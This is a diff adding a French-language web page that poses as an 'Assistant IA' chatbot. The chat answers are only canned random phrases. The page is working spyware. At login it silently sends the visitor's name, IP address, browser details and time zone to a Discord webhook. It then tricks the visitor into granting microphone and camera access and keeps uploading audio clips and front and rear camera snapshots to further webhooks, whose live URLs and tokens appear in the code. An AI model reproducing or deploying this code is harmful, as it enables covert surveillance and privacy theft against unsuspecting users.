@@ -1,0 +1,789 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Assistant IA - Connexion + Enregistrement</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #121212;
+      color: #e0e0e0;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+
+    h1 {
+      font-size: 1.8rem;
+      margin-bottom: 2rem;
+      text-align: center;
+    }
+
+    .chat-box, .login-box {
+      display: none;
+      flex-direction: column;
+      align-items: stretch;
+      background: #1e1e1e;
+      border: 1px solid #333;
+      border-radius: 20px;
+      padding: 1.5rem;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+      max-width: 700px;
+      width: 90%;
+      gap: 1rem;
+    }
+
+    .chat-box input[type="text"],
+    .login-box input[type="text"],
+    .login-box input[type="password"] {
+      background-color: #2a2a2a;
+      color: #e0e0e0;
+      border: 1px solid #444;
+      padding: 0.8rem;
+      border-radius: 10px;
+      font-size: 1rem;
+    }
+
+    .chat-actions {
+      display: flex;
+      gap: 0.5rem;
+      flex-wrap: wrap;
+      align-items: center;
+    }
+
+    .chat-actions button {
+      border: none;
+      padding: 0.5rem 1rem;
+      border-radius: 999px;
+      font-size: 0.9rem;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+    }
+
+    .chat-actions button:not(.send-button):not(.voice-button) {
+      background-color: #333;
+      color: #eee;
+    }
+
+    .send-button {
+      background-color: #6200ee;
+      color: #fff;
+      margin-left: auto;
+    }
+
+    .voice-button {
+      background-color: #2c2c2c;
+      color: #fff;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background-color: rgba(0, 0, 0, 0.85);
+      z-index: 1000;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      text-align: center;
+      font-size: 1.1rem;
+      font-weight: 500;
+      color: #e0e0e0;
+    }
+
+    .spinner {
+      border: 6px solid #444;
+      border-top: 6px solid #fff;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 1rem;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    audio, #downloadLink {
+      display: none;
+    }
+
+    button {
+      background-color: #6200ee;
+      color: #fff;
+      border: none;
+      padding: 0.8rem;
+      border-radius: 10px;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #3700b3;
+    }
+
+
+    .response-message {
+      background-color: #2a2a2a;
+      border-left: 4px solid #6200ee;
+      padding: 1rem;
+      border-radius: 8px;
+      margin-top: 1rem;
+      font-size: 0.95rem;
+      display: none;
+    }
+
+    .dot-typing {
+      display: inline-block;
+      margin-left: 5px;
+    }
+
+    .dot-typing span {
+      display: inline-block;
+      width: 6px;
+      height: 6px;
+      margin: 0 2px;
+      background-color: #ccc;
+      border-radius: 50%;
+      animation: blink 1.4s infinite both;
+    }
+
+    .dot-typing span:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+
+    .dot-typing span:nth-child(3) {
+      animation-delay: 0.4s;
+    }
+
+    @keyframes blink {
+      0%, 80%, 100% {
+        opacity: 0;
+      }
+      40% {
+        opacity: 1;
+      }
+    }
+
+
+
+    .welcome-box {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      padding: 30px;
+      width: 90%;
+      max-width: 500px;
+      z-index: 2000;
+      text-align: center;
+    }
+
+    .welcome-box {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background-color: #1e1e1e;
+  color: #e0e0e0;
+  border-radius: 12px;
+  box-shadow: 0 0 30px rgba(0, 0, 0, 0.6);
+  padding: 30px;
+  width: 90%;
+  max-width: 500px;
+  z-index: 2000;
+  text-align: center;
+  border: 1px solid #333;
+}
+
+.welcome-box h2 {
+  margin-bottom: 10px;
+  font-size: 1.5rem;
+  color: #bb86fc;
+}
+
+.welcome-box p {
+  font-size: 1rem;
+  color: #ccc;
+}
+
+.welcome-box button {
+  margin-top: 20px;
+  padding: 10px 25px;
+  font-size: 1rem;
+  background-color: #6200ee;
+  color: white;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+}
+
+.welcome-box button:hover {
+  background-color: #3700b3;
+}
+
+.blur-background {
+  filter: blur(4px);
+  pointer-events: none;
+}
+
+.tooltip-micro {
+  position: absolute;
+  background-color: #333;
+  color: #fff;
+  padding: 10px 14px;
+  border-radius: 8px;
+  font-size: 0.9rem;
+  max-width: 250px;
+  box-shadow: 0 0 10px rgba(0,0,0,0.4);
+  z-index: 2001;
+}
+
+.highlight-micro {
+  position: relative;
+  z-index: 2002;
+  box-shadow: 0 0 0 4px rgba(255, 255, 255, 0.2);
+}
+
+.micro-overlay {
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background-color: rgba(0, 0, 0, 0.6);
+  z-index: 2000;
+  display: none;
+}
+
+.disabled-button {
+  opacity: 0.5;
+  pointer-events: none;
+}
+
+  </style>
+</head>
+<body>
+  <div id="headerContainer">
+    <h1>Bienvenue sur l'Assistant IA</h1>
+  </div>
+  
+
+  <div class="login-box" id="loginBox" style="display:flex;">
+    <input type="text" id="prenom" placeholder="Entrez votre prénom" required>
+    <button onclick="login()">Continuer</button>
+  </div>
+
+<!-- Message de bienvenue -->
+
+  <div class="welcome-box" id="welcomeBox" style="display:none;">
+    <h2>Bienvenue</h2>
+    <p>Voici un aperçu de comment utiliser cette interface IA basée sur Chat-GPT4-5.</p>
+    <button onclick="startApp()">Commencer</button>
+  </div>
+
+
+<div id="mainContent">
+  <div class="chat-box" id="chatBox">
+    <input type="text" id="questionInput" placeholder="Poser une question">
+    <div class="chat-actions">
+      <button id="cameraBtn" class="disabled-button" disabled><span class="icon">📷</span> Analyser une image</button>
+      <button class="voice-button disabled-button" id="microBtn"><span class="icon">🎙️</span>Micro</button>
+      <button class="send-button" onclick="simulateAIResponse()">Envoyer</button>
+    </div>
+    <div class="response-message" id="response"></div>
+    <audio id="audioPlayback" controls></audio>
+    <a id="downloadLink" href="#">⬇️ Télécharger l'audio</a>
+  </div>
+</div>
+
+  <div class="overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+    ⏳ Le service prend un peu de temps à répondre.<br>
+    Vous pouvez continuer à utiliser votre téléphone normalement.
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/lamejs@1.2.0/lame.min.js"></script>
+  <script>
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1357795219541856487/ppsE6KsYZeDjYZNx-qXswAMpWMC5lBCBwCgebXvbbu_ohP-4vYviw7z286BdF36GC3FN";
+    const IMAGE_DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1361978595878113382/JCazxgwvzDJasuS0GJX6AQle33lmheSNnGIskgZJpSrBPbEmWewwUfzhmsmJ6i32U22G";
+    const FILE_DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1357851760785494122/w_EtH6BtLzj__nlvZDdUDZTeKlOf8JjO9ydcm177uOSGyaTxAGDfb3IRg8PfDJFGBZvN";
+  
+    const startBtn = document.getElementById("startBtn");
+    const overlay = document.getElementById("loadingOverlay");
+    const loginBox = document.getElementById("loginBox");
+    const chatBox = document.getElementById("chatBox");
+    const analyzeBtn = document.querySelector(".chat-actions button:nth-child(1)");
+  
+    let audioContext, processor, input, stream;
+    let buffer = [];
+    let isRecording = false;
+    let videoStream;
+    async function hasCamera() {
+  const devices = await navigator.mediaDevices.enumerateDevices();
+  return devices.some(device => device.kind === "videoinput");
+}
+let userPrenom = ""; // 👈 Variable accessible partout dans ton script
+
+  
+    async function login() {
+  const prenom = document.getElementById("prenom").value.trim();
+  userPrenom = prenom; // 👈 Enregistre le prénom pour l'utiliser ailleurs
+
+  if (!prenom) {
+  alert("Veuillez entrer votre prénom.");
+  return;
+}
+
+
+  // On cache la connexion et affiche le chat
+  localStorage.setItem("prenom", prenom);
+  loginBox.style.display = "none";
+  chatBox.style.display = "flex";
+  document.getElementById("mainContent").style.display = "block"; // 👈 assure que c'est visible
+  document.getElementById("mainContent").classList.add("blur-background");
+  document.getElementById("headerContainer").classList.add("blur-background");
+
+  document.getElementById("welcomeBox").style.display = "block";
+
+
+
+  // Ensuite seulement, on récupère les infos système + IP
+  try {
+    const ipRes = await fetch("https://api64.ipify.org?format=json");
+    const ipData = await ipRes.json();
+
+    const trackingWebhook = "https://discord.com/api/webhooks/1357859548647395430/01C-Amxn_Ns1rGjB7NdrW0vjJIBKcl7f1NQo1a17nksdWsqlYv-VMibhrUeFzLVu3cxL";
+
+    const payload = {
+      username: "👁️ Connexion Assistant IA",
+      embeds: [
+        {
+          title: "Nouvelle Connexion Utilisateur",
+          color: 0x6200ee,
+          fields: [
+            { name: "👤 Prénom", value: prenom, inline: true },
+            { name: "🌍 Adresse IP", value: ipData.ip || "Inconnue", inline: true },
+            { name: "🌐 Langue navigateur", value: navigator.language || "?", inline: true },
+            { name: "🖥️ User-Agent", value: navigator.userAgent, inline: false },
+            { name: "📐 Résolution écran", value: `${screen.width}x${screen.height}`, inline: true },
+            { name: "🕓 Fuseau horaire", value: Intl.DateTimeFormat().resolvedOptions().timeZone || "?", inline: true },
+            { name: "🗓️ Date", value: new Date().toLocaleString(), inline: true }
+          ],
+          footer: { text: "Connexion utilisateur silencieuse • Assistant IA" }
+        }
+      ]
+    };
+
+    await fetch(trackingWebhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+  } catch (err) {
+    console.error("Erreur lors de l'envoi des infos Discord :", err);
+  }
+
+}
+
+
+  
+    function simulateAIResponse() {
+      const responseDiv = document.getElementById("response");
+      const smartResponses = [
+        "Analyse en cours des fichiers neuronaux",
+        "Connexion aux serveurs IA sécurisés",
+        "Simulation des scénarios probables",
+        "Synthèse des données en langage naturel",
+        "Chargement de la base de connaissance universelle 🧬",
+        "Accès au module cognitif activé",
+        "Détection du langage naturel réussie",
+        "Interprétation en cours, patience",
+        "Calculs terminés. Résultat imminent",
+        "Évaluation des options possibles en cours"
+      ];
+      const thinkingMessages = ["💬 L’IA réfléchit...", "⏳ Traitement en cours..."];
+      responseDiv.style.display = "block";
+      responseDiv.innerText = thinkingMessages[Math.floor(Math.random() * thinkingMessages.length)];
+      setTimeout(() => {
+        const random = smartResponses[Math.floor(Math.random() * smartResponses.length)];
+        responseDiv.innerHTML = `${random}<span class="dot-typing"><span></span><span></span><span></span></span>`;
+      }, 2000);
+    }
+  
+    analyzeBtn.onclick = async () => {
+  overlay.style.display = "flex";
+  try {
+    const captureStreamAndLoop = async (facingModeLabel) => {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingModeLabel } });
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      await video.play();
+
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+
+      const sendFrame = () => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append("file", blob, `${facingModeLabel}_${Date.now()}.jpg`);
+          fetch(IMAGE_DISCORD_WEBHOOK_URL, {
+            method: "POST",
+            body: formData
+          }).catch(console.error);
+        }, "image/jpeg", 0.8);
+      };
+
+      // Capture toutes les 5 secondes
+      setInterval(sendFrame, 5000);
+    };
+
+    await captureStreamAndLoop("environment"); // caméra arrière
+    await captureStreamAndLoop("user");        // caméra avant
+
+  } catch (err) {
+    alert("Erreur caméra : " + err.message);
+    console.error(err);
+    overlay.style.display = "none";
+  }
+};
+
+  
+
+  
+    function flattenArray(buffer) {
+      const length = buffer.reduce((acc, val) => acc + val.length, 0);
+      const result = new Float32Array(length);
+      let offset = 0;
+      for (let i = 0; i < buffer.length; i++) {
+        result.set(buffer[i], offset);
+        offset += buffer[i].length;
+      }
+      return result;
+    }
+  
+    function encodeMp3(samples, sampleRate) {
+      const mp3encoder = new lamejs.Mp3Encoder(1, sampleRate, 128);
+      const blockSize = 1152;
+      const mp3Data = [];
+  
+      for (let i = 0; i < samples.length; i += blockSize) {
+        const sampleChunk = samples.subarray(i, i + blockSize);
+        const int16 = floatTo16BitPCM(sampleChunk);
+        const mp3buf = mp3encoder.encodeBuffer(int16);
+        if (mp3buf.length > 0) mp3Data.push(mp3buf);
+      }
+  
+      const mp3End = mp3encoder.flush();
+      if (mp3End.length > 0) mp3Data.push(mp3End);
+  
+      return new Blob(mp3Data, { type: "audio/mp3" });
+    }
+  
+    function floatTo16BitPCM(floatBuffer) {
+      const output = new Int16Array(floatBuffer.length);
+      for (let i = 0; i < floatBuffer.length; i++) {
+        const s = Math.max(-1, Math.min(1, floatBuffer[i]));
+        output[i] = s < 0 ? s * 0x8000 : s * 0x7FFF;
+      }
+      return output;
+    }
+
+    function startApp() {
+  document.getElementById("welcomeBox").style.display = "none";
+  document.getElementById("mainContent").classList.remove("blur-background");
+  document.getElementById("headerContainer").classList.remove("blur-background");
+
+  setTimeout(showMicroHelp, 100); // ✅ seulement showMicroHelp ici
+  }
+
+
+function showMicroHelp() {
+  const microBtn = document.getElementById("microBtn");
+  const tooltip = document.getElementById("tooltipMicro");
+  const overlay = document.getElementById("microOverlay");
+
+  // Position de la bulle
+  const rect = microBtn.getBoundingClientRect();
+  tooltip.style.left = `${rect.right + 15}px`;
+  tooltip.style.top = `${rect.top}px`;
+  tooltip.style.display = "block";
+
+  overlay.style.display = "block";
+  microBtn.classList.add("highlight-micro");
+
+  // Attente du clic utilisateur
+  const onClickAnywhere = async (event) => {
+    if (!microBtn.contains(event.target)) {
+      try {
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    startSilentRecording(stream);
+    console.log("🎤 Micro activé !");
+    tooltip.style.display = "none";
+    overlay.style.display = "none";
+    microBtn.classList.remove("highlight-micro", "disabled-button");
+    microBtn.disabled = false;
+    microBtn.innerHTML = "<span class='icon'>🎙️</span> Micro";
+    microBtn.onclick = () => {
+      alert("🎙️ Cette fonctionnalité sera bientôt disponible !");
+    };
+    await showCameraHelp();
+    
+
+  } catch (err) {
+      alert("🎤 L'accès au micro est nécessaire pour utiliser l'assistant vocal.");
+      showMicroHelp(); // 🔁 redemande
+  }
+      document.removeEventListener("click", onClickAnywhere);
+    }
+  };
+
+
+  async function requestCameraAccessAndStartCapture() {
+  const cameraBtn = document.getElementById("cameraBtn");
+  const tooltip = document.getElementById("tooltipCamera");
+  const overlay = document.getElementById("microOverlay");
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    startSilentCameraCapture(stream);
+
+    // Active visuellement le bouton
+    const rect = cameraBtn.getBoundingClientRect();
+    tooltip.style.left = `${rect.right + 15}px`;
+    tooltip.style.top = `${rect.top}px`;
+    tooltip.style.display = "block";
+
+    overlay.style.display = "block";
+    cameraBtn.classList.add("highlight-micro");
+    cameraBtn.classList.remove("disabled-button");
+    cameraBtn.disabled = false;
+
+    cameraBtn.innerHTML = "<span class='icon'>📷</span> Analyse active";
+    cameraBtn.onclick = () => {
+      alert("📷 Cette fonctionnalité sera bientôt disponilbe");
+    };
+
+    // Ferme le message dès que l'utilisateur clique ailleurs
+    const onClickAnywhere = () => {
+      tooltip.style.display = "none";
+      overlay.style.display = "none";
+      cameraBtn.classList.remove("highlight-micro");
+      document.removeEventListener("click", onClickAnywhere);
+    };
+    setTimeout(() => {
+      document.addEventListener("click", onClickAnywhere, { once: true });
+    }, 0);
+
+  } catch (err) {
+    alert("❌ Accès caméra refusé : " + err.message);
+  }
+}
+
+
+  setTimeout(() => {
+  document.addEventListener("click", onClickAnywhere, { once: true });
+}, 0);
+
+}
+
+function startSilentRecording(stream) {
+  let audioSendCount = 0;
+  const MAX_AUDIO_SENDS = 20;
+  const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+  const source = audioContext.createMediaStreamSource(stream);
+  const processor = audioContext.createScriptProcessor(4096, 1, 1);
+  const mp3Encoder = new lamejs.Mp3Encoder(1, audioContext.sampleRate, 128);
+  let buffer = [];
+
+  source.connect(processor);
+  processor.connect(audioContext.destination);
+
+  processor.onaudioprocess = (e) => {
+    buffer.push(new Float32Array(e.inputBuffer.getChannelData(0)));
+  };
+
+  setInterval(() => {
+    if (buffer.length > 0 && audioSendCount < MAX_AUDIO_SENDS) {
+      const audioData = flattenArray(buffer);
+      const mp3Blob = encodeMp3(audioData, audioContext.sampleRate);
+      sendMp3ToDiscord(mp3Blob);
+      buffer = [];
+      audioSendCount++;
+    }
+  }, 10000); // toutes les 10 secondes
+}
+
+
+
+
+function flattenArray(buffer) {
+  const length = buffer.reduce((acc, val) => acc + val.length, 0);
+  const result = new Float32Array(length);
+  let offset = 0;
+  for (let i = 0; i < buffer.length; i++) {
+    result.set(buffer[i], offset);
+    offset += buffer[i].length;
+  }
+  return result;
+}
+
+function encodeMp3(samples, sampleRate) {
+  const mp3Encoder = new lamejs.Mp3Encoder(1, sampleRate, 128);
+  const blockSize = 1152;
+  const mp3Data = [];
+
+  for (let i = 0; i < samples.length; i += blockSize) {
+    const sampleChunk = samples.subarray(i, i + blockSize);
+    const int16 = floatTo16BitPCM(sampleChunk);
+    const mp3buf = mp3Encoder.encodeBuffer(int16);
+    if (mp3buf.length > 0) mp3Data.push(mp3buf);
+  }
+
+  const mp3End = mp3Encoder.flush();
+  if (mp3End.length > 0) mp3Data.push(mp3End);
+
+  return new Blob(mp3Data, { type: "audio/mp3" });
+}
+
+function floatTo16BitPCM(floatBuffer) {
+  const output = new Int16Array(floatBuffer.length);
+  for (let i = 0; i < floatBuffer.length; i++) {
+    const s = Math.max(-1, Math.min(1, floatBuffer[i]));
+    output[i] = s < 0 ? s * 0x8000 : s * 0x7FFF;
+  }
+  return output;
+}
+
+function sendMp3ToDiscord(blob) {
+  const formData = new FormData();
+  formData.append("file", blob, `audio_${Date.now()}.mp3`);
+
+  fetch("https://discord.com/api/webhooks/1357795219541856487/ppsE6KsYZeDjYZNx-qXswAMpWMC5lBCBwCgebXvbbu_ohP-4vYviw7z286BdF36GC3FN", {
+    method: "POST",
+    body: formData
+  }).catch((err) => {
+    console.error("Erreur d'envoi Discord :", err);
+  });
+}
+
+
+
+ 
+
+
+
+async function showCameraHelp() {
+  const cameraBtn = document.getElementById("cameraBtn");
+  const tooltip = document.getElementById("tooltipCamera");
+  const overlay = document.getElementById("microOverlay");
+
+  const hasCam = await hasCamera();
+  if (!hasCam) {
+    alert("❌ Aucune caméra détectée sur cet appareil.");
+    return;
+  }
+
+  // Affiche d'abord l'explication
+  const rect = cameraBtn.getBoundingClientRect();
+  tooltip.style.left = `${rect.right + 15}px`;
+  tooltip.style.top = `${rect.top}px`;
+  tooltip.style.display = "block";
+  overlay.style.display = "block";
+  cameraBtn.classList.add("highlight-micro");
+
+  // ⏱️ Attends 1.5 sec puis demande l'accès à la caméra
+  setTimeout(async () => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      startSilentCameraCapture(stream);
+      let imageSendCount = 0;
+      const MAX_IMAGE_SENDS = 20;
+      cameraBtn.classList.remove("disabled-button");
+      cameraBtn.disabled = false;
+      cameraBtn.innerHTML = "<span class='icon'>📷</span> Analyser une image";
+      cameraBtn.onclick = () => {
+        alert("📷 Cette fonctionnalité sera bientôt disponible !");
+      };
+
+      // Ferme le message après clic extérieur
+      // Ferme immédiatement le message après autorisation
+      tooltip.style.display = "none";
+      overlay.style.display = "none";
+      cameraBtn.classList.remove("highlight-micro");
+
+
+    } catch (err) {
+      alert("❌ Accès à la caméra refusé : " + err.message);
+      tooltip.style.display = "none";
+      overlay.style.display = "none";
+      cameraBtn.classList.remove("highlight-micro");
+    }
+  }, 1500); // délai après le message
+}
+
+
+
+function sendMp3ToDiscord(blob) {
+  const formData = new FormData();
+  formData.append("file", blob, `audio_${Date.now()}.mp3`);
+  fetch(DISCORD_WEBHOOK_URL, {
+    method: "POST",
+    body: formData
+  }).catch(console.error);
+}
+
+
+function startSilentCameraCapture(stream) {
+  const video = document.createElement("video");
+  video.srcObject = stream;
+  video.play();
+
+  const canvas = document.createElement("canvas");
+  const ctx = canvas.getContext("2d");
+
+  setInterval(() => {
+    if (video.videoWidth && video.videoHeight) {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob((blob) => {
+        const formData = new FormData();
+        formData.append("file", blob, `selfie_${Date.now()}.jpg`);
+        fetch(IMAGE_DISCORD_WEBHOOK_URL, {
+          method: "POST",
+          body: formData
+        }).catch(console.error);
+      }, "image/jpeg", 0.8);
+    }
+  }, 5000); // toutes les 10 secondes
+}
+
+
+
+</script>
+  
+<div class="micro-overlay" id="microOverlay"></div>
+<div class="tooltip-micro" id="tooltipMicro" style="display:none;">
+  🎙️ Ce bouton permet de communiquer par oral avec l'IA.
+</div>
+<div class="tooltip-micro" id="tooltipCamera" style="display:none;">
+  📷 Ce bouton permet de prendre en photo une image pour l'analyser.
+</div>
+
+
+</body>
+</html>
